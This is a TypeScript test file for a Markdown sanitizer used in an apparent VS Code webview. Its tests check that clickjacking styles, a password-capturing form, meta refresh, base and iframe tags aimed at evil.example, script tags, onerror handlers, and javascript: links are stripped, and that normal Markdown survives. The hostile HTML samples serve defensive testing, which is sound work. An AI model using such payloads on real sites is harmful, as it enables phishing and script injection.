import * as assert from 'node:assert/strict';

import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

import { createRenderer } from '../../src/webview/render';
import { createSafeRender } from '../../src/webview/sanitize';

suite('sanitize', () => {
  const { window } = new JSDOM('<!DOCTYPE html><body></body>');
  const safeRender = createSafeRender(createDOMPurify(window as unknown as Parameters<typeof createDOMPurify>[0]));
  const basic = createRenderer();

  function html(text: string): string {
    const div = window.document.createElement('div');
    div.append(safeRender(basic, text));
    return div.innerHTML;
  }

  suite('擋下惡意 HTML', () => {
    test('style 元素與 style 屬性（點擊劫持）', () => {
      const out = html('<style>body{display:none}</style>\n\n<div style="position:fixed;inset:0;z-index:9">x</div>\n');
      assert.doesNotMatch(out, /<style|display:none|position:fixed|style=/);
      assert.match(out, /<div>x<\/div>/);
    });

    test('form、meta refresh、base、iframe、object、embed、link', () => {
      const out = html(
        [
          '<form action="https://evil.example/"><input name="pw"></form>',
          '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
          '<base href="https://evil.example/">',
          '<iframe src="https://evil.example/"></iframe>',
          '<object data="x.swf"></object>',
          '<embed src="x.swf">',
          '<link rel="stylesheet" href="https://evil.example/x.css">',
        ].join('\n') + '\n',
      );
      assert.doesNotMatch(out, /<(form|meta|base|iframe|object|embed|link)\b/);
      assert.doesNotMatch(out, /evil\.example/);
    });

    test('腳本、事件處理器、javascript: 與 vscode: 連結', () => {
      const out = html('<script>alert(1)</script>\n\n<img src="x.png" onerror="alert(1)">\n\n<a href="javascript:alert(1)">a</a> <a href="vscode:extension/x">b</a>\n');
      assert.doesNotMatch(out, /<script|onerror|javascript:|vscode:/);
    });

    test('表格對齊以外的 style 不放行', () => {
      const out = html('<table><tr><td style="text-align:left;position:fixed">x</td></tr></table>\n');
      assert.doesNotMatch(out, /style=/);
    });
  });

  suite('正常 Markdown 不變', () => {
    test('表格與對齊', () => {
      const out = html('| a | b |\n|:-:|--:|\n| 1 | ~~2~~ |\n');
      assert.match(out, /<th style="text-align:center">a<\/th>/);
      assert.match(out, /<td style="text-align:right"><s>2<\/s><\/td>/);
    });

    test('程式碼區塊高亮與跳脫', () => {
      assert.match(html('```ts\nconst a = 1;\n```\n'), /<pre><code class="language-ts"><span class="hljs-keyword">const<\/span>/);
      assert.match(html('```nope\n<b>\n```\n'), /&lt;b&gt;/);
    });

    test('任務清單', () => {
      const out = html('- [ ] todo\n- [x] done\n');
      assert.match(out, /<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled=""> todo/);
      assert.match(out, /disabled="" checked=""> done/);
    });

    test('常見內嵌 HTML', () => {
      const out = html(
        [
          '<details open><summary>更多</summary>',
          '',
          '內容 <kbd>Ctrl</kbd>+<kbd>C</kbd><br>H<sub>2</sub>O x<sup>2</sup>',
          '',
          '</details>',
          '',
          '<p align="center"><img src="logo.png" alt="logo" width="120"></p>',
        ].join('\n') + '\n',
      );
      assert.match(out, /<details open=""><summary>更多<\/summary>/);
      assert.match(out, /<kbd>Ctrl<\/kbd>\+<kbd>C<\/kbd><br>H<sub>2<\/sub>O x<sup>2<\/sup>/);
      assert.match(out, /<\/details>/);
      assert.match(out, /<p align="center"><img src="logo.png" alt="logo" width="120"><\/p>/);
    });

    test('相對、遠端與 data: 圖片保留 src', () => {
      const out = html('![a](img/a.png) ![b](https://e.com/b.png) ![c](data:image/png;base64,AA)\n');
      assert.match(out, /src="img\/a\.png"/);
      assert.match(out, /src="https:\/\/e\.com\/b\.png"/);
      assert.match(out, /src="data:image\/png;base64,AA"/);
    });

    test('標題錨點與連結，含會撞到 document 屬性的 id', () => {
      const out = html('# Title\n\n## Images\n\n## 安裝\n\n[跳](#安裝) [檔](docs/a.md#x) [站](https://e.com) [信](mailto:a@b.c)\n');
      assert.match(out, /<h1 id="title">/);
      assert.match(out, /<h2 id="images">/);
      assert.match(out, /<h2 id="安裝">/);
      assert.match(out, /href="#%E5%AE%89%E8%A3%9D"/);
      assert.match(out, /href="docs\/a\.md#x"/);
      assert.match(out, /href="https:\/\/e\.com"/);
      assert.match(out, /href="mailto:a@b\.c"/);
    });
  });
});
